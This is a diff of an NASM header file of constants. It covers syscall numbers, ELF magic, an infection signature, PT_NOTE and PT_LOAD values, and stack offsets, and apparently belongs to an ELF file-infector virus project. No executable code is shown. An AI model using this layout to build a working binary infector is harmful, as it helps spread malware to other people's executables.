@@ -1,105 +1,59 @@
-%define DIRENT_SIZE 1024
-struc	linux_dirent
-	.d_ino			resq	1
-	.d_off			resq	1
-	.d_reclen		resw	1
-  	.d_type     		resb	1
-	.d_name			resb	1
-endstruc
+; Utils
+%define ELF64_MAGIC 0x464c457f
+%define PT_NOTE 0x4
+%define SCOTT_SIGNATURE 0x41424344
+%define JMP_REL_SIZE 5
+%define VADDR 0xc000000
+%define ALIGN 0x200000
+%define STACK_SIZE 4096
 
-%define TYPE_MASK		61440
-%define DIRECTORY_MODE		16384
-%define FILE_MODE		32768
-%define MMAP_PROT		3 ; PROT_READ | PROT_WRITE
-%define MAP_PRIVATE		2
-%define MAP_ANONYMOUS		32
+; Syscalls
+%define SYS_EXIT         60
+%define SYS_OPEN         2
+%define SYS_CLOSE        3
+%define SYS_WRITE        1
+%define SYS_READ         0
+%define SYS_GETDENTS64   217
+%define SYS_FSTAT       5
+%define SYS_LSEEK        8
+%define SYS_PREAD64      17
+%define SYS_PWRITE64     18
+%define SYS_SYNC        162
 
-%define STAT_STRUC_SIZE	144
-struc stat
-	.st_dev			resq 1
-	.st_ino			resq 1
-	.st_nlink		resq 1
-	.st_mode		resd 1
-	.st_uid			resd 1
-	.st_gid			resd 1
-	.pad0			resb 4
-	.st_rdev		resq 1
-	.st_size		resq 1
-	.st_blksize		resq 1
-	.st_blocks		resq 1
-	.st_atime		resq 1
-	.st_atime_nsec		resq 1
-	.st_mtime		resq 1
-	.st_mtime_nsec		resq 1
-	.st_ctime		resq 1
-	.st_ctime_nsec		resq 1
-endstruc
+%define STDOUT           1
+%define EHDR_SIZE        64
+%define ELFCLASS64       2
+%define O_RDONLY         0
+%define O_RDWR           2
+%define SEEK_END         2
+%define DT_REG           8
+%define PT_LOAD          1
+%define PT_NOTE          4
+%define PF_X             1
+%define PF_R             4
+%define FIRST_RUN        1
 
-%define EHDR_SIZE	64
-struc ehdr
-	.ei_mag			resd	1
-	.ei_class		resb	1
-	.ei_data		resb	1
-	.ei_version		resd	1
-	._pad0			resb	6
-	.e_type			resw	1
-	.e_machine		resw	1
-	.e_version		resd	1
-	.e_entry		resq	1
-	.e_phoff		resq	1
-	.e_shoff		resq	1
-	.e_flags		resd	1
-	.e_ehsize		resw	1
-	.e_phentsize		resw	1
-	.e_phnum		resw	1
-	.e_shentsize		resw	1
-	.e_shnum		resw	1
-	.e_shstrndx		resw	1
-endstruc
-
-%define SHDR_SIZE	64
-struc shdr
-	.sh_name		resd	1
-	.sh_type		resd	1
-	.sh_flags		resq	1
-	.sh_addr		resq	1
-	.sh_offset		resq	1
-	.sh_size		resq	1
-	.sh_link		resd	1
-	.sh_info		resd	1
-	.sh_addralign		resq	1
-	.sh_entsize		resq	1
-endstruc
-
-%define PHDR_SIZE	56
-struc phdr
-	.p_type			resd 1
-	.p_flags		resd 1
-	.p_offset		resq 1
-	.p_vaddr		resq 1
-	.p_paddr		resq 1
-	.p_filesz		resq 1
-	.p_memsz		resq 1
-	.p_align		resq 1
-endstruc
-
-; SCOTT
-%define ELF_STRUC_SIZE 1024
-struc elf_struc
-	.stat				resb	STAT_STRUC_SIZE
-	.path				resq	1
-	.fd				resq	1
-	.fd2				resq	1
-	.ptr				resq	1
-	.ptr_end			resq	1
-	.ehdr				resq	1
-	.old_entry			resq	1
-	.new_entry			resq	1
-	.bits_added			resq	1
-	.bss_size			resq	1
-	.data_shdr			resq	1
-	.data_phdr			resq	1
-	.shdr_names			resq	1
-	.new_code_offset		resq	1
-	.new_bin_addr			resq	1
-endstruc
+; Stack buffer offsets
+%define STAT 0
+%define ST_SIZE 48
+%define EHDR 144
+%define EHDR_CLASS 148
+%define EHDR_PAD 153
+%define EHDR_ENTRY 168
+%define EHDR_PHOFF 176
+%define EHDR_PHENTSIZE 198
+%define EHDR_PHNUM 200
+%define PHDR_TYPE 208
+%define PHDR_FLAGS 212
+%define PHDR_OFFSET 216
+%define PHDR_VADDR 224
+%define PHDR_PADDR 232
+%define PHDR_FILESZ 240
+%define PHDR_MEMSZ 248
+%define PHDR_ALIGN 256
+%define JMP_REL 300
+%define DIR_SIZE 350
+%define DIRENT 400
+%define DIRENT_D_RECLEN 416
+%define DIRENT_D_TYPE 418
+%define DIRENT_D_NAME 419
